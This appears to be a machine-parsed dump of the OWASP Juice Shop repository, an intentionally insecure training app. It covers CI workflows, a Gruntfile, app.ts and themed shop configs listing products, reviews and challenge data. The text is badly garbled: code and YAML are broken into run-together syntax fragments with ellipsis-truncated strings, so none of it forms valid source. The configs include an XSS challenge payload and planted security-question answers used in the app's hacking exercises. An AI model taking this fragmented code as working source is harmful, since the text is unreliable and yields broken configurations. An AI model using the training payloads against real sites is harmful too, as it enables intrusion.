name: " ... e test"docker-testExecute smoke test on Docker"Execut ... Docker"docker-compose -f docker-compose.test.yml up --exit-code-from sutdocker- ... rom sutname: " ... Docker"dockergithub.repository == 'juice-shop/juice-shop' && github.event_name == 'push' && (github.ref == 'refs/heads/develop' || github.ref == 'refs/heads/master')github. ... aster')[test,  ... r-test]Set up QEMU"Set up QEMU"docker/setup-qemu-action@68827325e0b33c7199eb31dd4e31fbe9023e06e3docker/ ... 23e06e3name: "Set up QEMU"Set up Docker Buildx"Set up ... Buildx"docker/setup-buildx-action@f95db51fddba0c2d1ec667646a06c2ce06100226docker/ ... 6100226name: " ... Buildx"Login to DockerHub"Login to DockerHub"docker/login-action@343f7c4344506bcbf9b4de18042ae17996df046ddocker/ ... 6df046d${{ secrets.DOCKERHUB_USERNAME }}${{ sec ... NAME }}${{ secrets.DOCKERHUB_TOKEN }}usernam ... NAME }}name: " ... kerHub"Set tag & labels for ${{ github.ref }}"Set ta ... ref }}"if [ "$GITHUB_REF" == "refs/heads/master" ]; then
echo "DOCKER_TAG=latest" >> $GITHUB_ENV
else
echo "DOCKER_TAG=snapshot" >> $GITHUB_ENV
fi
echo "VCS_REF=`git rev-parse --short HEAD`" >> $GITHUB_ENV
echo "BUILD_DATE=`date -u +%Y-%m-%dT%H:%M:%SZ`" >> $GITHUB_ENV
name: " ... ref }}"Build and push for AMD64 and ARM64 processors"Build  ... essors"docker/build-push-action@4a13e500e55cf31b7a5d59a38ab2040ab0f42f56docker/ ... 0f42f56./Dockerfileplatformslinux/amd64,linux/arm64linux/a ... x/arm64tagsbkimminich/juice-shop:${{ env.DOCKER_TAG }}
build-argsVCS_REF=${{ env.VCS_REF }}
BUILD_DATE=${{ env.BUILD_DATE }}
CYCLONEDX_NPM_VERSION=${{ env.CYCLONEDX_NPM_VERSION }}
context: .name: " ... essors"if: git ... aster')heroku[test,  ... g-test]Set Heroku app & branch for ${{ github.ref }}"Set He ... ref }}"if [ "$GITHUB_REF" == "refs/heads/master" ]; then
echo "HEROKU_APP=juice-shop" >> $GITHUB_ENV
echo "HEROKU_BRANCH=master" >> $GITHUB_ENV
else
echo "HEROKU_APP=juice-shop-staging" >> $GITHUB_ENV
echo "HEROKU_BRANCH=develop" >> $GITHUB_ENV
fi
Deploy ${{ github.ref }} to Heroku"Deploy ... Heroku"akhileshns/heroku-deploy@9fd0f9faae4aa93a38d6f5e25b9128589f1371b0akhiles ... f1371b0heroku_api_key${{ secrets.HEROKU_API_KEY }}heroku_app_name${{ env.HEROKU_APP }}${{ env ... _APP }}heroku_emailbjoern.kimminich@owasp.orgbjoern. ... asp.orgbranch${{ env.HEROKU_BRANCH }}${{ env ... ANCH }}heroku_ ... _KEY }}name: " ... Heroku"notify-slackgithub.repository == 'juice-shop/juice-shop' && github.event_name == 'push' && (success() || failure())github. ... lure())- dockerSlack workflow notification"Slack  ... cation"Gamesight/slack-workflow-status@26a36836c887f260477432e4314ec3490a84f309Gamesig ... a84f309repo_tokenslack_webhook_url${{ secrets.SLACK_WEBHOOK_URL }}${{ sec ... _URL }}repo_to ... OKEN }}- name: ... cation"if: git ... lure())lint:name: " ... peline"P:/My Drive/Git/juice-shop/.github/workflows/codeql-analysis.ymlCodeQL Scan"CodeQL Scan"tag:yaml.org,2002:nullanalyzeAnalyzesecurity-eventsactions: readjavascript-typescript'javasc ... script'[ 'java ... ript' ]languag ... ript' ]fail-fast: falseCheckout repositoryname: C ... ositoryInitialize CodeQLgithub/codeql-action/init@v2github/ ... init@v2${{ matrix.language }}${{ mat ... uage }}queriessecurity-extendedpaths-ignore:
  - 'data/static/codefixes'
languag ... uage }}name: I ...  CodeQLAutobuildgithub/codeql-action/autobuild@v2github/ ... uild@v2name: AutobuildPerform CodeQL AnalysisPerform ... nalysisgithub/codeql-action/analyze@v2github/ ... lyze@v2name: P ... nalysis- name: ... ositoryname: Analyzeanalyze:name: "CodeQL Scan"P:/My Drive/Git/juice-shop/.github/workflows/codeql.ymlCodeQL"CodeQL"branchesmaster"master"[ "master" ]branche ... ster" ]schedulecron25 15 * * 5'25 15 * * 5'cron: '25 15 * * 5'- cron: ...  * * 5'Analyze (${{ matrix.language }})Analyze ... age }})${{ (matrix.language == 'swift' && 'macos-latest') || 'ubuntu-latest' }}${{ (ma ... est' }}timeout-minutes${{ (matrix.language == 'swift' && 120) || 360 }}${{ (ma ...  360 }}packagessecurit ... : writejavascr ... escriptbuild-modenonelanguag ... escriptpythonlanguage: python- langu ... escriptinclude:actions/checkout@v4github/codeql-action/init@v3github/ ... init@v3${{ matrix.build-mode }}${{ mat ... mode }}matrix.build-mode == 'manual'matrix. ... manual'echo 'If you are using a "manual" build mode for one or more of the' \
  'languages you are analyzing, replace this with the commands to build' \
  'your code, for example:'
echo '  make bootstrap'
echo '  make release'
exit 1
if: mat ... manual'github/codeql-action/analyze@v3github/ ... lyze@v3category/language:${{matrix.language}}"/langu ... uage}}"categor ... uage}}"name: A ... age }})name: "CodeQL"P:/My Drive/Git/juice-shop/.github/workflows/lint-fixer.ymlLet me lint:fix that for you"Let me ... or you"[push]LMLFTFYnode-version: 18Fix everything which can be fixed"Fix ev ...  fixed"npm run lint:fix'npm run lint:fix'name: " ...  fixed"stefanzweifel/git-auto-commit-action@3ea6ae190baf489ba007f7c92608f33ce20ef04astefanz ... 20ef04acommit_messageAuto-fix linting issues"Auto-f ... issues"${{ github.head_ref }}${{ git ... _ref }}commit_options--signoff'--signoff'commit_user_nameJuiceShopBotcommit_user_email61591748+JuiceShopBot@users.noreply.github.com6159174 ... hub.comcommit_authorJuiceShopBot <61591748+JuiceShopBot@users.noreply.github.com>JuiceSh ... ub.com>commit_ ... issues"uses: s ... v4.16.0LMLFTFY:name: " ... or you"P:/My Drive/Git/juice-shop/.github/workflows/lock.ymlLock Threads'Lock Threads'0 0 * * *'0 0 * * *'cron: '0 0 * * *'- cron: '0 0 * * *'schedule:issuespull-requestsissues: writedessant/lock-threads@be8aa5be94131386884a6da4189effda9b14aa21dessant ... b14aa21issue-lock-commentThis thread has been automatically locked because it has not had recent activity after it was closed. :lock: Please open a new issue for regressions or related bugs.
issue-lock-reasonpr-lock-reasonissue-l ... ment: >uses: d ... #v4.0.1- uses: ... #v4.0.1action:name: 'Lock Threads'P:/My Drive/Git/juice-shop/.github/workflows/rebase.ymlAutomatic Rebaseissue_commentcreated[created]types: [created]issue_comment:rebaseRebasegithub.event.issue.pull_request != '' && contains(github.event.comment.body, '/rebase')github. ... ebase')fetch-depthfetch-depth: 0uses: a ... #v4.0.0cirrus-actions/rebase@b87d48154a87a85666003575337e27b8cd65f691cirrus- ... d65f691GITHUB_ ... OKEN }}name: A ...  Rebase- uses: ... #v4.0.0name: Rebasealways_jobAlways run jobAlways runecho "This job is used to prevent the workflow to fail when all other jobs are skipped."echo "T ... ipped."name: Always run- name: Always runname: Always run jobrebase:P:/My Drive/Git/juice-shop/.github/workflows/release.ymlRelease Pipeline"Release Pipeline"v*- v*tags:ANGULAR ... ION: 17packageif [ "$RUNNER_OS" == "Windows" ]; then
echo "PCKG_OS_NAME=win32" >> $GITHUB_ENV
elif [ "$RUNNER_OS" == "macOS" ]; then
echo "PCKG_OS_NAME=darwin" >> $GITHUB_ENV
else
echo "PCKG_OS_NAME=linux" >> $GITHUB_ENV
fi
echo "PCKG_CPU_ARCH=x64" >> $GITHUB_ENV
echo "PCKG_NODE_VERSION=${{ matrix.node-version }}" >> $GITHUB_ENV
Attach packaged archive to tag release'Attach ... elease'softprops/action-gh-release@de2c0eb89ae2a093876385947365aca7b0e5f844softpro ... 0e5f844draftdist/*draft: truename: ' ... elease'Get tag name"Get tag name"dawidd6/action-get-tag@727a6f0a561be04e09013531e73a3983a65e3479dawidd6 ... 65e3479name: "Get tag name"Set labels for ${{ github.ref }}"Set la ... ref }}"echo "VCS_REF=`git rev-parse --short HEAD`" >> $GITHUB_ENV
echo "BUILD_DATE=`date -u +%Y-%m-%dT%H:%M:%SZ`" >> $GITHUB_ENV
docker/build-push-action@0565240e2d4ab88bba5387d719585280857ece09docker/ ... 57ece09bkimminich/juice-shop:${{ steps.tag.outputs.tag }}
always()- packageif: always()package:P:/My Drive/Git/juice-shop/.github/workflows/stale.ymlClose stale issues and PR'Close  ... and PR'30 1 * * *'30 1 * * *'cron: '30 1 * * *'- cron: '30 1 * * *'staleactions/stale@5ebf00ea0e4c1561e9b43a292ed34424fb1d4578actions ... b1d4578stale-issue-messageThis issue has been automatically marked as `stale` because it has not had recent activity. :calendar: It will be _closed automatically_ in one week if no further activity occurs.
stale-pr-messageThis PR has been automatically marked as `stale` because it has not had recent activity. :calendar: It will be _closed automatically_ in two weeks if no further activity occurs.
close-issue-messageThis issue was closed because it has been stalled for 7 days with no activity.This is ... tivity.close-pr-messageThis PR was closed because it has been stalled for 14 days with no activity.This PR ... tivity.days-before-staledays-before-closedays-before-pr-closeexempt-issue-labelscritical,technical debt'critic ... l debt'exempt-assigneesstale-i ... sage: >uses: a ... r later- uses: ... r laterstale:name: ' ... and PR'P:/My Drive/Git/juice-shop/.github/workflows/update-challenges-www.ymlUpdate challenges on owasp-juice.shop"Update ... e.shop"[ master ]data/static/challenges.yml'data/s ... es.yml'- 'data ... es.yml'branches: [ master ]UpdateChallengesOnWebsiteUpdateC ... Websitegithub.repository == 'juice-shop/juice-shop'github. ... e-shop'Check o ... ository${{ secrets.BOT_TOKEN }}repositoryOWASP/www-project-juice-shopOWASP/w ... ce-shoptoken:  ... OKEN }}Update challenges.ymlUpdate  ... ges.ymlcd _data/
rm challenges.yml
wget https://raw.githubusercontent.com/juice-shop/juice-shop/master/data/static/challenges.yml
name: U ... ges.ymlAuto-update challenges.yml from ${{ github.sha }}"Auto-u ... sha }}"commit_ ... sha }}"if: git ... e-shop'UpdateC ... ebsite:name: " ... e.shop"P:/My Drive/Git/juice-shop/.github/workflows/update-news-www.ymlUpdate news on owasp-juice.shoppublished[ published ]types: [ published ]release:UpdateNewsOnWebsiteUpdate tab_news.mdsed -i 's/<!-- next:juice-shop -->/<!-- next:juice-shop -->\n* ${{ github.event.release.published_at }}: juice-shop [`${{ github.event.release.tag_name }}`](https:\/\/github.com\/juice-shop\/juice-shop\/releases\/tag\/${{ github.event.release.tag_name }})/' tab_news.md
name: U ... news.mdAdd juice-shop ${{ github.event.release.tag_name }} release notes to tab_news.md"Add ju ... ews.md"commit_ ... ews.md"UpdateNewsOnWebsite:P:/My Drive/Git/juice-shop/.github/workflows/zap_scan.ymlZAP Baseline Scan"ZAP Baseline Scan"0 18 * * 6'0 18 * * 6'cron:  '0 18 * * 6'- cron: ...  * * 6'zap_scanScan Juice Shop preview instance on HerokuScan Ju ...  Herokuref: developZAP Scanzaproxy/action-baseline@41aee98ebc7cf2802c3beae4e7d4336413a21e43zaproxy ... 3a21e43https://preview.owasp-juice.shop'https: ... e.shop'rules_file_name.zap/rules.tsv'.zap/rules.tsv'cmd_options-a -j'-a -j'name: ZAP Scanzap_scan:name: " ... e Scan"P:/My Drive/Git/juice-shop/.gitlab/auto-deploy-values.yamlP:/My Drive/Git/juice-shop/.gitlabserviceinternalPort3000externalPortinternalPort: 3000service:P:/My Drive/Git/juice-shop/.gitlab-ci.ymlAuto-DevOps.gitlab-ci.ymlAuto-De ... -ci.ymltemplat ... -ci.yml- templ ... -ci.ymlSAST_EXCLUDED_PATHSfrontend/src/assets/private/**"fronte ... ate/**"TEST_DISABLED"true"DAST_DISABLEDSAST_EX ... ate/**"P:/My Drive/Git/juice-shop/.gitpod.ymltasksinit: npm install- init: npm installOWASP Juice ShopThe Juice Shop web serverThe Jui ...  serveronOpenopen-previewname: O ... ce Shop- name: ... ce Shoptasks:P:/My Drive/Git/juice-shop/Gruntfile.js'use strict'gruntoption'os'PCKG_OS_NAME'platform'PCKG_CPU_ARCH'node'nodejs_versionPCKG_NODE_VERSIONinitConfigpkgreadJSON'package.json'replace_jsonmanifestchanges'engines.node''<%= pkg.engines.node %>''<%= pkg.os %>'cpu'<%= pkg.cpu %>'compresspckg==='linux''tgz''zip''dist/<%= pkg.name %>-<%= pkg.version %>'+'_node''_''.tgz''.zip''.well-known/**''ctf.key''swagger.yml''server.ts''config.schema.yml''build/**''!build/reports/**''bom.json''bom.xml''config/*.yml''data/*.ts''data/static/**''data/chatbot/.gitkeep''encryptionkeys/**''frontend/dist/frontend/**''frontend/dist/bom/**''frontend/src/**/*.ts''ftp/**''i18n/.gitkeep''lib/**''models/*.ts''node_modules/**''routes/*.ts''uploads/complaints/.gitkeep''views/**''juice-shop_<%= pkg.version %>/'registerTask'checksum''Create .md5 checksum files''fs''crypto''dist/'=>md5'md5'md5Hash'hex'md5FileName'.md5'`Checksum ${ written to file verbose'...'loadNpmTasks'grunt-replace-json''grunt-contrib-compress''package''replace_json:manifest''compress:pckg'use strictmodule. ... m'])\r\n}functio ... m'])\r\n}{\r\n  co ... m'])\r\n}const o ... E || ''os = gr ... E || ''grunt.o ... E || ''grunt.o ... OS_NAMEgrunt.option('os')grunt.optionprocess ... OS_NAMEprocess.envconst p ... H || ''platfor ... H || ''grunt.o ... H || ''grunt.o ... PU_ARCHgrunt.o ... tform')process ... PU_ARCHconst n ... N || ''node =  ... N || ''grunt.o ... N || ''grunt.o ... VERSIONgrunt.o ... versiongrunt.option('node')process ... versionprocess ... VERSIONgrunt.i ... }\r\n  })grunt.initConfig{\r\n     ...  }\r\n  }pkg: gr ... .json')grunt.f ... .json')grunt.file.readJSONgrunt.filepackage.jsonreplace ... \r\n    }manifes ...       }src: 'package.json'changes ...       }'engine ... de %>')engines.nodeengines(node | ... de %>')node || ... ode %>''<%= pk ... ode %>'<%= pkg.engines.node %><%= pkgnode %>os: (os ... os %>')(os ? [ ... os %>')os ? [o ... .os %>'[os]<%= pkg.os %>os %>cpu: (p ... pu %>')(platfo ... pu %>')platfor ... cpu %>'[platform]<%= pkg.cpu %>cpu %>compres ... \r\n    }pckg: { ...       }options ...       }mode: o ... : 'zip'os ===  ... : 'zip'os === 'linux'linuxtgzziparchive ... '.zip')'dist/< ... '.zip')'dist/< ... ) : '')'dist/< ... ion %>'dist/<%= pkg.name %>-<%= pkg.version %>(node ? ... ) : '')node ?  ... e) : ''('_node' + node)'_node' + node_node(os ? ( ... ) : '')os ? ('_' + os) : ''('_' + os)'_' + os_(platfo ... ) : '')platfor ... m) : ''('_' + platform)'_' + platform(os === ... '.zip')os ===  ...  '.zip'.tgz.zipfiles:  ...       ][\r\n     ...       ]src: [\r ...       ].well-known/**ctf.keyctfswagger.ymlswaggerymlserver.tsservertsconfig.schema.ymlschemabuild/**!build/reports/**bom.jsonbombom.xmlconfig/*.yml/*data/*.tsdata/static/**'data/c ... itkeep'data/chatbot/.gitkeepdata/chatbot/gitkeepencryptionkeys/**'fronte ... end/**'frontend/dist/frontend/**'fronte ... bom/**'frontend/dist/bom/**frontend/src/**/*.tsftp/**i18n/.gitkeepi18n/lib/**models/*.tsmodelsnode_modules/**routes/*.tsroutes'upload ... itkeep'uploads/complaints/.gitkeepuploads/complaints/views/**dest: ' ... on %>/''juice- ... on %>/'juice-shop_<%= pkg.version %>/juice-shop_<%= pkgversion %>/grunt.r ... )\r\n  })grunt.registerTaskchecksum'Create ...  files'Create .md5 checksum filesCreate md5 checksum filesfunctio ... })\r\n  }{\r\n     ... })\r\n  }const f ... e('fs')fs = require('fs')require('fs')const c ... rypto')crypto  ... rypto')require('crypto')fs.read ... \n    })fs.read ... forEachfs.read ... dist/')dist/file => ... \r\n    }const b ... + file)buffer  ... + file)fs.read ... + file)'dist/' + fileconst m ... ('md5')md5 = c ... ('md5')crypto. ... ('md5')md5.update(buffer)md5.updateconst m ... ('hex')md5Hash ... ('hex')md5.digest('hex')md5.digesthexconst m ...  '.md5'md5File ...  '.md5''dist/' ...  '.md5'.md5grunt.f ... d5Hash)grunt.file.writegrunt.l ... ').ok()grunt.l ... ..').okgrunt.l ... ('...')grunt.l ... e.writegrunt.l ... verbosegrunt.l ... ame}.`)grunt.log.writegrunt.log`Checks ... Name}.`...grunt.log.writeln()grunt.log.writelngrunt.l ... -json')grunt.loadNpmTasksgrunt-replace-jsongrunt.l ... press')'grunt- ... mpress'grunt-contrib-compressgrunt.r ... ksum'])['repla ... cksum']'replac ... nifest'replace_json:manifestcompress:pckgP:/My Drive/Git/juice-shop/app.tsvalidateDependenciesawait'./lib/startup/validateDependenciesBasic''./server'async f ... rt()\r\n}{\r\n  co ... rt()\r\n}const { ... Basic'){ defau ... Basic'){ defau ... ncies }default ... denciesawait i ... Basic')import( ... Basic')'./lib/ ... sBasic'./lib/startup/validateDependenciesBasic/lib/startup/validateDependenciesBasicawait v ... ncies()validat ... ncies()const s ... erver')server  ... erver')await i ... erver')import('./server')./server/serverawait server.start()server.start()server.startapp()\r\n ... r\r\n  })app()\r\n  .catchapp()err =>  ... rr\r\n  }{\r\n     ... rr\r\n  }throw errtypescriptP:/My Drive/Git/juice-shop/config/7ms.ymlP:/My Drive/Git/juice-shop/configapplication7-ms.us7 Minute Security'7 Minute Security'logohttps://static1.squarespace.com/static/59f9e1c4d0e6281017434039/t/59fd39cde31d1945635d5fbb/1530161239161/7.png'https: ... /7.png'faviconhttps://7minsec.com/favicon.ico'https: ... on.ico'themeblue-lightblueshowGitHubLinksaltcoinNameSevencoinprivacyContactEmaildonotreply@7-ms.us'donotreply@7-ms.us'customMetricsPrefixsevenminsecchatBotBrian'Brian'greetingHi <customer-name>, it's me, your friend and pal <bot-name>!"Hi <cu ... name>!"trainingDatahttps://gist.githubusercontent.com/bkimminich/d62bd52a1df4831a0fae7fb06062e3f0/raw/59dadc1e0ab1b5cb9264e85bc78736aaa3f0eb6b/bot7msTrainingData.json'https: ... a.json'defaultResponseSorry, but "no comprende"!"Sorry, ... nde\"!"avatarhttps://images.squarespace-cdn.com/content/v1/59f9e1c4d0e6281017434039/94c89793-630d-41a4-9976-91fef527f8d0/BrianJohnson-headshot-2022-2-small.png?format=500w'https: ... t=500w'name: 'Brian'socialtwitterUrlhttps://twitter.com/7MinSec'https: ... MinSec'facebookUrlslackUrlhttps://7ms.us/slack'https: ... /slack'redditUrlpressKitUrlnftUrlquestionnaireUrltwitter ... MinSec'recyclePagetopProductImagebm-small.jpgbottomProductImagetommyboy.jpegtopProd ... all.jpgwelcomeBannershowOnFirstStartshowOnF ... : falsecookieConsentIf you stay on this website for more than 7 minutes our cookies will start tracking you.'If you ... g you.'dismissTextI`ll be long gone by then!'I`ll b ...  then!'linkTextBut I want to stay an arbitrary number of minutes!'But I  ... nutes!'linkUrlhttps://7ms.us/7ms-294-gdpr-me-asap/'https: ... -asap/'message ... g you.'securityTxtcontactmailto:donotreply@7-ms.us'mailto ... -ms.us'encryption~contact ... -ms.us'easterEggPlanetMad Billy-7'Mad Billy-7'overlayMaphttps://static1.squarespace.com/static/59505bc2414fb538a0532c76/t/599e266aebbd1a759716569b/1503536748248/logo+2.png'https: ... +2.png'name: 'Mad Billy-7'domain: 7-ms.uschallengesxssBonusPayload<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/265098051&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>'<ifram ... frame>'xssBonu ... frame>'hackingInstructoravatarImageavatarI ... t=500w'productsSecurity Assessment'Securi ... ssment'price1999.99tag:yaml.org,2002:floatRather than just pointing out the gaps in your administrative, physical and technical controls, 7 Minute Security will partner with you to help formulate - and execute - a measurable remediation plan.'Rather ...  plan.'https://images.squarespace-cdn.com/content/v1/59f9e1c4d0e6281017434039/1618506026604-MMMHZED4KRAPGNEBL50V/website_photos_securityassessments01.jpg?format=750w'https: ... t=750w'name: ' ... ssment'Penetration Test'Penetration Test'<em>"Can the bad guys get in?"</em> An internal and/or external network penetration test will gauge your organization`s defenses and help answer that question.  After the test, 7 Minute Security will work with you on the technical defenses you need to put in place.'<em>"C ... place.'1899.99https://images.squarespace-cdn.com/content/v1/59f9e1c4d0e6281017434039/1618506146888-XHHF0XYUR6D3YK46F3OJ/website_photos_pentesting01.jpg?format=750wname: ' ... n Test'Training7 Minute Security can train your employees to not only be more secure at work, but carry that security-focused attitude into everything they do at home as well.  More tech-heavy sessions are available as well, such as <em>Penetration Testing 101</em> and <em>Intro to Windows System Forensics</em>.'7 Minu ... </em>.'899.99https://images.squarespace-cdn.com/content/v1/59f9e1c4d0e6281017434039/1618506195524-DNXS4OW3C65ZVKX7O3QQ/website_photos_training.jpg?format=750wreviewsWow, that lady can fingerpoint IPs like a pro!'Wow, t ... a pro!'bender{ text: ... ender }- { tex ... ender }name: TrainingBilly Madison 1.1'Billy Madison 1.1'Billy Madison is a vulnerable virtual machine, hosted by Vulnhub. To successfully pwn the box, pentesters must undo modifications to the system and recover Billys 12th grade project. Otherwise Eric and his weasel laugh will take over Madison Hotels!'Billy  ... otels!'999.99https://static1.squarespace.com/static/59f9e1c4d0e6281017434039/t/5a01bef9c83025f467396e34/1510063870501/bm-small.jpg'https: ... ll.jpg'urlForProductTamperingChallengeurlForP ... allengehttps://www.vulnhub.com/entry/billy-madison-11,161/'https: ... 1,161/'name: ' ... on 1.1'Billy Madison 1.0'Billy Madison 1.0'Christmas Special Re-Release Edition of the famous VulnHub VM! Rare collectors item! Available only Christmas 2014!'Christ ...  2014!'12999.99useForChristmasSpecialChallengeuseForC ... allengename: ' ... on 1.0'Tommy Boy 1.0'Tommy Boy 1.0'Tommy Boy is a vulnerable virtual machine, hosted by VulnHub and based one of my all-time favorite movies. To complete the CTF, pentesters must bring the Callahan Auto brakepad ordering system back online before the company goes out of business.'Tommy  ... iness.'799.99https://static1.squarespace.com/static/59f9e1c4d0e6281017434039/t/5a01bfaa71c10b9d51d59d2e/1510081203010/tommyboy.jpeg'https: ... y.jpeg'name: ' ... oy 1.0'CryptoLocker`d (Audio CD)'Crypto ... io CD)'A few years ago a worked on an incident response where a user got phished with a promise of a free burrito from Chipotle but instead got a free order of CryptoLocker! And rather than tell IT or sound the alarms, the user just left for the day! The next day they came back and the company was digitally on fire, and they played ignorant to what was going on.  I found the user`s handling of the situation humorous (read: not the CryptoLocker infection itself!), so I was inspired to write a song about it.'A few  ... ut it.'19.99https://pbs.twimg.com/media/Dc3BuBPXUAAswae.jpg'https: ... ae.jpg'fileForRetrieveBlueprintChallengefileFor ... allengeThe+CryptoLocker+Song.mpsThe+Cry ... ong.mpsexifForBlueprintChallengeexifFor ... allenge- ~name: ' ... io CD)'Sweet Surrender (Limited Edition Best of Audio CD)'Sweet  ... io CD)'Sweet Surrender is a vocals-driven acoustic duo from the Twin Cities area. Our music reflects a diverse range of our musical tastes - from the most current pop and country tunes on the radio today, to some great older tunes done with a twist. We also love to share music that reflects our love for Christ through the most current, contemporary Christian music.'Sweet  ... music.'29.99https://static1.squarespace.com/static/59208d27c534a58e9b17ec06/t/59208d69197aea2df1397c7b/1505596635447.png'https: ... 47.png'keywordsForPastebinDataLeakChallengekeyword ... allengetaylor swiftkaty perry- taylor swift7MSagotchi'7MSagotchi'This cute little rascal is called a Pwnagotchi. It can look around like a champion!'This c ... mpion!'40https://images.squarespace-cdn.com/content/v1/59f9e1c4d0e6281017434039/1587693073228-8GDKF12U0LBBKO5XEPFA/image-asset.jpeg?format=2500w'https: ... =2500w'FlipperZero FTW!'FlipperZero FTW!'bjoern{ text: ... joern }As you mentioned FlipperZero: @Brian, did you get one by now? Any chance we get this RTTTL version of the amazing JS jingle going? See https://github.com/juice-shop/pwning-juice-shop/issues/105 - Cheers!'As you ... heers!'bjoernOwasp{ text: ... Owasp }- { tex ... joern }name: '7MSagotchi'7MS #230: Pentesting OWASP Juice Shop - Part 1'7MS #2 ... Part 1'Today we`re kicking of a multipart series all about hacking the OWASP Juice Shop which is "an intentionally insecure webapp for security trainings written entirely in Javascript which encompasses the entire OWASP Top Ten and other severe security flaws."'Today  ... laws."'1.99https://i.ytimg.com/vi/IC6m249zvI0/hqdefault.jpg'https: ... lt.jpg'name: ' ... Part 1'7MS #231: Pentesting OWASP Juice Shop - Part 2'7MS #2 ... Part 2'Today we`re continuing our series on hacking apart the OWASP Juice Shop which is "an intentionally insecure webapp for security trainings written entirely in Javascript which encompasses the entire OWASP Top Ten and other severe security flaws."hqdefault.jpgname: ' ... Part 2'7MS #232: Pentesting OWASP Juice Shop - Part 3'7MS #2 ... Part 3'Today is part <strong>three</strong> of our continuing series on attacking the OWASP Juice Shop which is "an intentionally insecure webapp for security trainings written entirely in Javascript which encompasses the entire OWASP Top Ten and other severe security flaws."name: ' ... Part 3'7MS #233: Pentesting OWASP Juice Shop - Part 4'7MS #2 ... Part 4'Today is part <strong>FOUR</strong> of our continuing series on attacking the OWASP Juice Shop which is "an intentionally insecure webapp for security trainings written entirely in Javascript which encompasses the entire OWASP Top Ten and other severe security flaws."name: ' ... Part 4'7MS #234: Pentesting OWASP Juice Shop - Part 5'7MS #2 ... Part 5'Today is part <strong>FIVE</strong> (insert menacing voice: "<em>the final chapter!!!</em>) of our series on attacking the <a href="https://www.owasp.org/index.php/OWASP_Juice_Shop_Project" target="_blank">OWASP Juice Shop</a> which is "an intentionally insecure webapp for security trainings written entirely in Javascript which encompasses the entire OWASP Top Ten and other severe security flaws."name: ' ... Part 5'7MS #606: Hacking OWASP Juice Shop (2024 edition)'7MS #6 ... ition)'Join OWASP's Bjorn Kimminich and Paul Wilch from Project7 as we hack away at what is probably the most modern and sophisticated insecure Web application ever made: Juice Shop!"Join O ...  Shop!"name: ' ... ition)'-memorieshttps://images.squarespace-cdn.com/content/v1/59f9e1c4d0e6281017434039/1587695798282-PYCQEJEVJS1OF5FJY07A/pw.JPG?format=750wThere goes our ISO 27001 cert... "Thanks", Chris! :-('There  ... s! :-('cisoimage:  ... t=750w'https://images.squarespace-cdn.com/content/v1/59f9e1c4d0e6281017434039/1569207865247-XHRW3XQ0XVKNEG46L579/usergroup.jpg?format=2500wLast meeting of our user group pre-covid...'Last m ... vid...'stanimage:  ... =2500w'favorite-hiking-place.png'favori ... ce.png'I love going hiking here...'I love ... ere...'geoStalkingMetaSecurityQuestiongeoStal ... uestiongeoStalkingMetaSecurityAnswergeoStal ... yAnswerDaniel Boone National Forest'Daniel ... Forest'image:  ... ce.png'IMG_4253.jpg'IMG_4253.jpg'My old workplace...'My old ... ace...'geoStalkingVisualSecurityQuestiongeoStalkingVisualSecurityAnswerITsec'ITsec'image:  ... 53.jpg'application:P:/My Drive/Git/juice-shop/config/addo.ymlad.doAllDayDeflOps'AllDayDeflOps'https://www.alldaydevops.com/hubfs/2019-ADDO/2019%20Logo%20Files/ADDO_Logo_2019_White.svg'https: ... te.svg'https://www.sonatype.com/hubfs/ADDO-2018/ADDO_fav4.png'https: ... v4.png'pink-bluegreyADDcOindonotreply@ad.do'donotreply@ad.do'addoBobby'Bobby'https://www.alldaydevops.com/hs-fs/hubfs/2019-ADDO/2019-footer-bobby-1.png?width=135&name=2019-footer-bobby-1.png'https: ... -1.png'name: 'Bobby'https://twitter.com/AllDayDevOps'https: ... DevOps'https://www.facebook.com/AllDayDevOps/'https: ... evOps/'https://join.slack.com/t/alldaydevops/shared_invite/enQtNzc3NDc2NDQ2OTAwLTRhMjBjNTg2NTM4ZWRmZmQxMDEyNGNmMDI1OGM2ZDMzYjUwZmY4Mjc0NGJiODJkNjVhYmU2ZTBmNGZlNDUwMjc'https: ... DUwMjc'https://www.alldaydevops.com/2019resources'https: ... ources'twitter ... DevOps'undefined.pngtopProd ... ned.pngTaste our 150 practitioner-baked cookies with 5 tracking flavors!'Taste  ... avors!'Register for 24/7 cookies!'Regist ... okies!'Yum, tell me more!'Yum, tell me more!'https://www.alldaydevops.com/privacy-policy-addo'https: ... y-addo'message ... avors!'mailto:donotreply@ad.do'mailto ... @ad.do'contact ... @ad.do'A-DD-0'A-DD-0'https://www.sonatype.com/hubfs/2019-ADDO/BG_Bobby-2019_3.png'https: ... _3.png'name: 'A-DD-0'domain: ad.do<iframe width="560" height="315" src="https://www.youtube.com/embed/-Q6ergK_mXw" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>avatarI ... -1.png'Feedback Loops: Voices of All Day DevOps: Volume 1'Feedba ... lume 1'Four Years of Countless DevOps Journeys Unveiled at All Day DevOps. Over the years, All Day DevOps has explored the stories of over 275 community practitioners around the world - and as we know, with any journey, there is never a single path to success.'Four Y ... ccess.'14.95https://www.alldaydevops.com/hubfs/2019-ADDO/Operation%20Graphics/ADDO_book_covers_yellow_forHS.jpg'https: ... HS.jpg'https://sptf.info/images/pn1_fbl.pdf'https: ... bl.pdf'name: ' ... lume 1'DevSecOps Reference Architectures 2019'DevSec ... s 2019'Gloriously referential! Whitepaperesquely architectural!'Glorio ... tural!'42.00quantityhttps://www.alldaydevops.com/hubfs/2019-ADDO/Operation%20Graphics/Untitled%20design%20(3).png'https: ... 3).png'http://bit.ly/2YIjdt7'http:/ ... YIjdt7'name: ' ... s 2019'DevSecOps Reference Architectures 2018'DevSec ... s 2018'Very referential! Mildly architectural!'Very r ... tural!'21.00undefined.jpgname: ' ... s 2018'Epic Failures in DevSecOps, Vol. 1'Epic F ... Vol. 1'One topic. Nine authors. Where did they go wrong? Through short stories from expert practitioners, observe patterns the DevSecOps community can learn from to safely push the boundaries of software development.'One to ... pment.'7.42https://www.alldaydevops.com/hubfs/2019-ADDO/Sponsor%20Logos/Epic%20Failures%20Volume%2001%20-%20Featured%20Image.jpg'https: ... ge.jpg'name: ' ... Vol. 1'2018 DevSecOps'2018 DevSecOps'Introduction to DevSecOps by DJ Schleen'Introd ... 